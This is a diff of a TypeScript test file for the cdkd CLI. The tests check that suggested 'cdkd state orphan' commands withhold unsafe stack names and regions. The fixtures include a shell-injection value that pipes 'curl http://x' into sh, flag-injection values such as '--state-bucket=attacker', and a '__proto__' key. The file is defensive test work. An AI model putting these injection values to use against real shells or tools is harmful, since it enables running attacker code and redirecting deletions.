@@ -8,6 +8,7 @@ import {
   buildPerStackImportNodes,
   buildResolvedParametersPerStack,
   cdkd2cfnStackName,
+  orphanWithholdWhy,
   extractChildImportParameters,
   filterTemplateForImport,
   flattenCdkdStateTreeLeafFirst,
@@ -32,6 +33,7 @@ import {
 } from '../../../src/cli/commands/export.js';
 import { getLogger } from '../../../src/utils/logger.js';
 import { PASTE_PAYLOADS, spansThatRun, withPasteDir } from '../utils/paste-harness.js';
+import { shellQuote } from '../../../src/utils/pasteable-command.js';
 import type { StackState } from '../../../src/types/state.js';
 import type { S3StateBackend } from '../../../src/state/s3-state-backend.js';
 import type { AwsClients } from '../../../src/utils/aws-clients.js';
@@ -3956,9 +3958,35 @@ describe('buildCdkdStateStackTree (issue #464 PR B1)', () => {
       'a shell metacharacter',
       "A'; curl http://x|sh; echo '",
       (m: string) => {
-        // SHELL-QUOTED, so the pasteable line cannot break out of its argument.
-        expect(m).not.toMatch(/cdkd state orphan [^'\n]*;/);
-        expect(m).toContain("cdkd state orphan 'Root~A'\\''; curl http://x|sh; echo '\\'''");
+        // WITHHELD as not a plain identifier (go-to-k/cdkd#3997): the command
+        // names neither value, so no metacharacter reaches the pasteable line.
+        expect(m).not.toMatch(/cdkd state orphan [^\n]*curl/);
+        expect(m).toContain(
+          "its record's stack name is not a plain identifier (a letter or digit, then letters, " +
+            "digits, '~', '_', '.' or '-'), which cdkd does not print on a command line."
+        );
+        expect(m.endsWith("Drop it with: cdkd state orphan '<stack>' --stack-region '<region>'")).toBe(
+          true
+        );
+      },
+    ],
+    [
+      // The shape go-to-k/cdkd#3997 names: a name padded so a terminal wraps
+      // part of it onto what reads as its own `…with: cdkd …` line. It renders
+      // EXACTLY (medial spaces survive `displaySafe`), so only the
+      // plain-identifier rule withholds it.
+      'medial padding spelling a second command line',
+      `A${' '.repeat(80)}Drop it with: cdkd state orphan X`,
+      (m: string) => {
+        // The command line carries holes, not the padded name. (The prose head
+        // above still names it: the value-in-prose shape, tracked apart.)
+        expect(m.split('\n').at(-1)).toBe(
+          "Drop it with: cdkd state orphan '<stack>' --stack-region '<region>'"
+        );
+        expect(m).toContain("its record's stack name is not a plain identifier");
+        expect(m.endsWith("Drop it with: cdkd state orphan '<stack>' --stack-region '<region>'")).toBe(
+          true
+        );
       },
     ],
     [
@@ -3974,7 +4002,18 @@ describe('buildCdkdStateStackTree (issue #464 PR B1)', () => {
         expect(m).toContain('cdkd state list --json');
         expect(m).not.toContain('--long');
         expect(m).toContain('replacing each quoted hole, quotes included, with the shell-quoted value');
+        // `state list --json` prints {stackName, region}, not a key.
+        expect(m).toContain('act on the one whose stackName and region match');
         expect(m).not.toMatch(/cdkd state orphan 'Root~A'/);
+        // The reason is the GATE's, for the value it withheld, and the note
+        // sits BEFORE the command, which ends the message (go-to-k/cdkd#3436).
+        expect(m).toContain(
+          "The next line's command names neither value, because its record's stack name does " +
+            'NOT render exactly (another record may render identically).'
+        );
+        expect(m.endsWith("Drop it with: cdkd state orphan '<stack>' --stack-region '<region>'")).toBe(
+          true
+        );
       },
     ],
     [
@@ -4028,12 +4067,14 @@ describe('buildCdkdStateStackTree (issue #464 PR B1)', () => {
     ['the STACK NAME', '--state-bucket=attacker', 'us-east-1'],
     ['the REGION', 'Root', '--state-bucket=attacker'],
   ])(
-    'withholds the orphan command when %s would be read as a flag (go-to-k/cdkd#3499 M8)',
+    'withholds the orphan command when %s begins with a - (go-to-k/cdkd#3499 M8)',
     async (_, rootName, region) => {
-      // The value renders EXACTLY, so the raw compare admits it — and the
-      // shell strips the quotes `shellQuote` adds, handing Commander that argv
-      // entry as the FLAG. A record-DELETING command would then be pointed at
-      // an attacker-named bucket. The cases drive the ROOT name and the region
+      // The value renders EXACTLY, so the raw compare admits it. As the STACK
+      // NAME, the shell strips the quotes `shellQuote` adds and Commander reads
+      // the positional as the FLAG, pointing a record-DELETING command at an
+      // attacker-named bucket. As the REGION it is `--stack-region`'s value,
+      // which Commander takes as given (measured); the gate refuses it
+      // conservatively all the same. The cases drive the ROOT name and the region
       // because this site passes the PARENT's `stackName` to the builder, not
       // the child's — not because a derived name cannot start with `-`, which
       // it can when its own root does (m16 of the go-to-k/cdkd#3499 review).
@@ -4052,8 +4093,249 @@ describe('buildCdkdStateStackTree (issue #464 PR B1)', () => {
       expect(message).toContain('missing nested-child');
       expect(message).toContain("cdkd state orphan '<stack>' --stack-region '<region>'");
       expect(message).not.toMatch(/cdkd state orphan [^\n]*--state-bucket=attacker/);
+      // The note names the value the gate withheld and its reason, and only
+      // that one: a note keyed on a predicate of its own would name both.
+      const isRegion = rootName === 'Root';
+      const named = isRegion ? 'region' : 'stack name';
+      const other = isRegion ? 'stack name' : 'region';
+      // Only the POSITIONAL parses as a flag; Commander takes the word after
+      // `--stack-region` as its value, so the region's sentence claims less.
+      const why = isRegion
+        ? "begins with a '-', which cdkd refuses to print as an argument"
+        : "begins with a '-', which 'cdkd state orphan' could parse as a flag";
+      expect(message).toContain(
+        `The next line's command names neither value, because its record's ${named} ${why}.`
+      );
+      expect(message).not.toContain(`record's ${other}`);
+      expect(message).not.toContain(`its ${other}`);
+      // Never "fill the hole" for a STACK NAME: `'--all'` parses as the option
+      // in the positional whatever the quoting, so that instruction would
+      // rebuild the command. The region's hole is a flag value, safe to fill.
+      const noFill =
+        'repair or remove the one whose stackName and region match by hand — this stack name ' +
+        "begins with a '-' and could parse as an option in that position, so do not fill a " +
+        'hole with it.';
+      if (isRegion) {
+        expect(message).not.toContain(noFill);
+        expect(message).toContain('replacing each quoted hole');
+      } else {
+        expect(message).toContain(noFill);
+        expect(message).not.toContain('replacing each quoted hole');
+      }
+      expect(message.endsWith("cdkd state orphan '<stack>' --stack-region '<region>'")).toBe(true);
     }
   );
+
+  it('withholds a REGION that renders exactly but is not a plain identifier, naming only it (go-to-k/cdkd#3997)', async () => {
+    const region = 'us-east-1 x';
+    const root = makeState({
+      stackName: 'Root',
+      region,
+      resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
+    });
+    const backend = makeStateBackendMock({ [`Root|${region}`]: root }) as S3StateBackend;
+    const message = (
+      (await buildCdkdStateStackTree('Root', region, backend).catch((e: unknown) => e)) as Error
+    ).message;
+    expect(message).toContain(
+      "The next line's command names neither value, because its record's region is not a plain " +
+        "identifier (a letter or digit, then letters, digits, '~', '_', '.' or '-'), which cdkd " +
+        'does not print on a command line.'
+    );
+    // Only the region: the stack name is plain and is not blamed.
+    expect(message).not.toContain('stack name is not a plain identifier');
+    // A region is a flag's value, so its hole may be filled.
+    expect(message).toContain('replacing each quoted hole');
+    expect(message.endsWith("cdkd state orphan '<stack>' --stack-region '<region>'")).toBe(true);
+  });
+
+  it.each([
+    ['stack name', 'q'.repeat(STACK_REF_MAX_CODE_POINTS + 1), 'us-east-1', 'is too long to print'],
+    ['region', 'Root', '', 'is empty'],
+  ])(
+    "renders the gate's reason for a withheld %s (go-to-k/cdkd#3436)",
+    async (what, rootName, region, why) => {
+      const root = makeState({
+        stackName: rootName,
+        region,
+        resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
+      });
+      const backend = makeStateBackendMock({ [`${rootName}|${region}`]: root }) as S3StateBackend;
+
+      const thrown = await buildCdkdStateStackTree(rootName, region, backend).catch(
+        (e: unknown) => e
+      );
+
+      const message = (thrown as Error).message;
+      expect(message).toContain(
+        `The next line's command names neither value, because its record's ${what} ${why}.`
+      );
+      expect(message.endsWith("cdkd state orphan '<stack>' --stack-region '<region>'")).toBe(true);
+    }
+  );
+
+  it('never says to fill the stack hole with a name beginning with -, whatever reason withheld it (go-to-k/cdkd#3436)', async () => {
+    // The gate reports `too-long` before `option-shaped`, so the recovery
+    // instruction cannot be keyed on the reason alone.
+    const rootName = `--${'x'.repeat(STACK_REF_MAX_CODE_POINTS)}`;
+    const root = makeState({
+      stackName: rootName,
+      region: 'us-east-1',
+      resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
+    });
+    const backend = makeStateBackendMock({ [`${rootName}|us-east-1`]: root }) as S3StateBackend;
+
+    const thrown = await buildCdkdStateStackTree(rootName, 'us-east-1', backend).catch(
+      (e: unknown) => e
+    );
+
+    const message = (thrown as Error).message;
+    // And when the gate calls it ALTERED first (a zero-width space).
+    const alteredName = '--all\u200b';
+    const altered = makeState({
+      stackName: alteredName,
+      region: 'us-east-1',
+      resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
+    });
+    const alteredThrown = await buildCdkdStateStackTree(
+      alteredName,
+      'us-east-1',
+      makeStateBackendMock({ [`${alteredName}|us-east-1`]: altered }) as S3StateBackend
+    ).catch((e: unknown) => e);
+    expect((alteredThrown as Error).message).toContain("its record's stack name does NOT render exactly");
+    expect((alteredThrown as Error).message).toContain('so do not fill a hole with it.');
+    expect((alteredThrown as Error).message).not.toContain('replacing each quoted hole');
+    expect(message).toContain("its record's stack name is too long to print.");
+    // The tail says WHY the no-fill rule applies, since the reason above is
+    // the cap, not the dash (m3 of the go-to-k/cdkd#3924 review).
+    expect(message).toContain(
+      "this stack name begins with a '-' and could parse as an option in that position, so do " +
+        'not fill a hole with it.'
+    );
+    expect(message).not.toContain('replacing each quoted hole');
+  });
+
+  it('names a stack name AT the cap, so the too-long refusal is the cap and not a shorter bound', async () => {
+    const rootName = 'q'.repeat(STACK_REF_MAX_CODE_POINTS);
+    const root = makeState({
+      stackName: rootName,
+      region: 'us-east-1',
+      resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
+    });
+    const backend = makeStateBackendMock({ [`${rootName}|us-east-1`]: root }) as S3StateBackend;
+
+    const thrown = await buildCdkdStateStackTree(rootName, 'us-east-1', backend).catch(
+      (e: unknown) => e
+    );
+
+    expect(
+      (thrown as Error).message.endsWith(
+        `\nDrop it with: cdkd state orphan ${rootName} --stack-region us-east-1`
+      )
+    ).toBe(true);
+  });
+
+  it('answers the reason orphanCommandFor cannot reach with a true sentence, not a throw (go-to-k/cdkd#3924 m2)', () => {
+    // A throw would escape the state-deletion warn's `catch` (M4's hazard).
+    // `not-plain` IS reachable since go-to-k/cdkd#3997 and has its own sentence.
+    for (const positional of [true, false]) {
+      expect(orphanWithholdWhy('pattern-shaped', positional)).toBe(
+        "cannot be printed as an argument to 'cdkd state orphan'"
+      );
+      expect(orphanWithholdWhy('not-plain', positional)).toBe(
+        "is not a plain identifier (a letter or digit, then letters, digits, '~', '_', '.' or '-'), which " +
+          'cdkd does not print on a command line'
+      );
+    }
+  });
+
+  it('fails CLOSED on a non-string stack name instead of throwing (go-to-k/cdkd#3924 M4)', async () => {
+    // `unknown` in, handed to the gate unconverted: a non-string is withheld,
+    // and the leading-`-` check must not call `.startsWith` on it.
+    const rootName = 123 as unknown as string;
+    const root = makeState({
+      stackName: rootName,
+      region: 'us-east-1',
+      resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
+    });
+    const backend = makeStateBackendMock({ '123|us-east-1': root }) as S3StateBackend;
+
+    const thrown = await buildCdkdStateStackTree(rootName, 'us-east-1', backend).catch(
+      (e: unknown) => e
+    );
+
+    const message = (thrown as Error).message;
+    expect(thrown).not.toBeInstanceOf(TypeError);
+    expect(message).toContain("because its record's stack name is not a string.");
+    expect(message.endsWith("\nDrop it with: cdkd state orphan '<stack>' --stack-region '<region>'")).toBe(
+      true
+    );
+  });
+
+  it('names BOTH withheld values in one note when both are refused (go-to-k/cdkd#3436)', async () => {
+    const rootName = '--all';
+    const region = 'us-east-1\u200b';
+    const root = makeState({
+      stackName: rootName,
+      region,
+      resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
+    });
+    const backend = makeStateBackendMock({ [`${rootName}|${region}`]: root }) as S3StateBackend;
+
+    const thrown = await buildCdkdStateStackTree(rootName, region, backend).catch(
+      (e: unknown) => e
+    );
+
+    expect((thrown as Error).message).toContain(
+      "The next line's command names neither value, because its record's stack name begins " +
+        "with a '-', which 'cdkd state orphan' could parse as a flag; and its region does NOT " +
+        'render exactly (another record may render identically).'
+    );
+  });
+
+  it("pastes nothing runnable from the nested-child refusal's remedy sentence and command, named or withheld (go-to-k/cdkd#3436)", async () => {
+    const messages: string[] = [];
+    for (const { value } of PASTE_PAYLOADS) {
+      for (const rootName of [value, `-${value}`]) {
+        const root = makeState({
+          stackName: rootName,
+          region: 'us-east-1',
+          resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
+        });
+        const backend = makeStateBackendMock({ [`${rootName}|us-east-1`]: root }) as S3StateBackend;
+        const thrown = await buildCdkdStateStackTree(rootName, 'us-east-1', backend).catch(
+          (e: unknown) => e
+        );
+        const message = (thrown as Error).message;
+        // Each case's PREMISE, pinned before the paste: a payload name is
+        // WITHHELD as not a plain identifier (go-to-k/cdkd#3997); its
+        // `-`-leading twin is withheld with the no-fill note above. Inert
+        // spans alone would pass a gate that stopped withholding.
+        expect(message).toContain(
+          rootName === value
+            ? "is not a plain identifier (a letter or digit, then letters, digits, '~', '_', '.' or '-'), which cdkd does not print on a command line."
+            : 'so do not fill a hole with it.'
+        );
+        expect(message).toContain(
+          "\nDrop it with: cdkd state orphan '<stack>' --stack-region '<region>'"
+        );
+        messages.push(message);
+      }
+    }
+    withPasteDir((dir) => {
+      for (const message of messages) {
+        expect(message).toContain('missing nested-child');
+        // From the remedy sentence on: the note and the command this change
+        // builds. The head before it still renders record values inside
+        // hand-written `'...'` (`safeSegment`), which is a PROSE shape outside
+        // this builder, and pasting it does run — so it is excluded here by
+        // name rather than allowed to pass a whole-message assertion.
+        const tail = message.slice(message.indexOf('The cdkd state tree is inconsistent'));
+        expect(tail).toContain('cdkd state orphan');
+        expect(spansThatRun(tail, dir), message).toEqual([]);
+      }
+    });
+  }, 120_000);
 
   /**
    * THE INSTRUMENT, after three review rounds each found another site.
@@ -4209,19 +4491,30 @@ describe('buildCdkdStateStackTree (issue #464 PR B1)', () => {
       fileURLToPath(new URL('../../../src/cli/commands/export.ts', import.meta.url)),
       'utf-8'
     );
-    const reads = /\bphysicalId\b|\b(?:properties|attributes)\[|\bresourceIdentifier\b|\bpropertiesOverlay\b/;
+    // One regex PER BRANCH, each with its own floor where the tree has sites,
+    // so one broken branch cannot hide behind another's matches
+    // (go-to-k/cdkd#3910). `attributes[`, `resourceIdentifier` and
+    // `propertiesOverlay` have NO interpolated site today — every such value
+    // reaches a message through a local — so they carry no floor: they stay
+    // watched, and the first site they match gets the boundary requirement.
+    const branches: Array<{ name: string; re: RegExp; floor: number }> = [
+      { name: 'physicalId', re: /\bphysicalId\b/, floor: 20 },
+      { name: 'properties[', re: /\bproperties\[/, floor: 1 },
+      { name: 'attributes[', re: /\battributes\[/, floor: 0 },
+      { name: 'resourceIdentifier', re: /\bresourceIdentifier\b/, floor: 0 },
+      { name: 'propertiesOverlay', re: /\bpropertiesOverlay\b/, floor: 0 },
+    ];
     const rendered = /^(?:showRecordValue|preDeletedLine|commandHole)\(/;
-    const interpolations = [...source.matchAll(/\$\{([^{}`]*)\}/g)]
+    const all = [...source.matchAll(/\$\{([^{}`]*)\}/g)]
       .map((m) => ({ expr: (m[1] as string).trim(), at: m.index ?? 0 }))
-      .filter(({ expr }) => reads.test(expr))
       // `Object.keys(...)` of a `resourceIdentifier` lists the splitter's own
       // field-name constants, never a recorded value.
       .filter(({ expr }) => !expr.startsWith('Object.keys('));
-    // Non-vacuity: the shape this case watches exists, and is rendered, at
-    // many sites — a regex that stopped matching cannot pass.
-    expect(interpolations.filter(({ expr }) => rendered.test(expr)).length).toBeGreaterThanOrEqual(
-      20
-    );
+    for (const { name, re, floor } of branches) {
+      const hits = all.filter(({ expr }) => re.test(expr) && rendered.test(expr));
+      expect(hits.length, `rendered sites for the ${name} branch`).toBeGreaterThanOrEqual(floor);
+    }
+    const interpolations = all.filter(({ expr }) => branches.some(({ re }) => re.test(expr)));
     expect(
       interpolations
         .filter(({ expr }) => !rendered.test(expr))
@@ -4992,6 +5285,27 @@ describe('buildResolvedParametersPerStack (issue #464 follow-up — root-first p
     expect(intrinsicSkippedByCdkdName.size).toBe(0);
   });
 
+  it("reads a parent parameter named '__proto__' as an own key (go-to-k/cdkd#3916)", async () => {
+    // On a `{}` bag, assigning `__proto__` sets the PROTOTYPE, so the child's
+    // Ref would miss and the parameter would be skipped.
+    const rootTemplate = JSON.parse(
+      '{"Parameters":{"__proto__":{"Type":"String"}},"Resources":{"Child":{"Type":"AWS::CloudFormation::Stack","Properties":{"Parameters":{"Stage":{"Ref":"__proto__"}}}}}}'
+    ) as Record<string, unknown>;
+    const tree = treeNode('Root', new Map([['Child', treeNode('Root~Child', new Map())]]));
+    const { paramsByCdkdName, intrinsicSkippedByCdkdName } = await buildResolvedParametersPerStack({
+      rootStackName: 'Root',
+      rootParameters: [{ ParameterKey: '__proto__', ParameterValue: 'prod' }],
+      perStackNodes: [
+        node('Root', rootTemplate),
+        node('Root~Child', { Resources: {} }, { stack: 'Root', logicalId: 'Child' }),
+      ],
+      tree,
+      resolver,
+    });
+    expect(paramsByCdkdName.get('Root~Child')).toEqual([{ ParameterKey: 'Stage', ParameterValue: 'prod' }]);
+    expect(intrinsicSkippedByCdkdName.get('Root~Child')).toBeUndefined();
+  });
+
   it('records unresolvable Parameters in intrinsicSkippedByCdkdName', async () => {
     const rootTemplate = {
       Resources: {
@@ -5246,8 +5560,57 @@ describe('buildPerStackImportNodes (issue #464 PR B2)', () => {
       message.split('\n').some((line) => line.trim().startsWith('cdkd state orphan Healthy'))
     ).toBe(false);
     // And the suggested command is withheld, because the name does not render
-    // exactly once sanitized.
-    expect(message).toContain("cdkd state orphan '<stack>' --stack-region '<region>'");
+    // exactly once sanitized — LAST, on a labelled line of its own, with the
+    // gate's reason in the sentence before it (go-to-k/cdkd#3436).
+    expect(
+      message.endsWith("\nRemove it with: cdkd state orphan '<stack>' --stack-region '<region>'")
+    ).toBe(true);
+    expect(message).toContain(
+      "its record's stack name does NOT render exactly (another record may render identically)"
+    );
+  });
+
+  it('ends the missing-asset-path refusal on a NAMED orphan command, alone on its labelled line (go-to-k/cdkd#3436)', () => {
+    const tree: CdkdStateStackTree = {
+      stackName: 'Root',
+      region: 'us-east-1',
+      state: makeState({
+        stackName: 'Root',
+        region: 'us-east-1',
+        resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
+      }),
+      nestedChildren: new Map([
+        [
+          'Child',
+          {
+            stackName: 'Root~Child',
+            region: 'us-east-1',
+            state: makeState({ stackName: 'Root~Child', region: 'us-east-1' }),
+            nestedChildren: new Map(),
+          },
+        ],
+      ]),
+    };
+    const thrown = (() => {
+      try {
+        buildPerStackImportNodes(
+          'Root',
+          { Resources: { Child: { Type: 'AWS::CloudFormation::Stack' } } },
+          {},
+          'json',
+          tree
+        );
+        return undefined;
+      } catch (e: unknown) {
+        return e;
+      }
+    })();
+    const message = (thrown as Error).message;
+    expect(
+      message.endsWith(
+        "remove the cdkd state for the orphaned child.\nRemove it with: cdkd state orphan 'Root~Child' --stack-region us-east-1"
+      )
+    ).toBe(true);
   });
 
   it('loads a child template via the nested-template path index', () => {
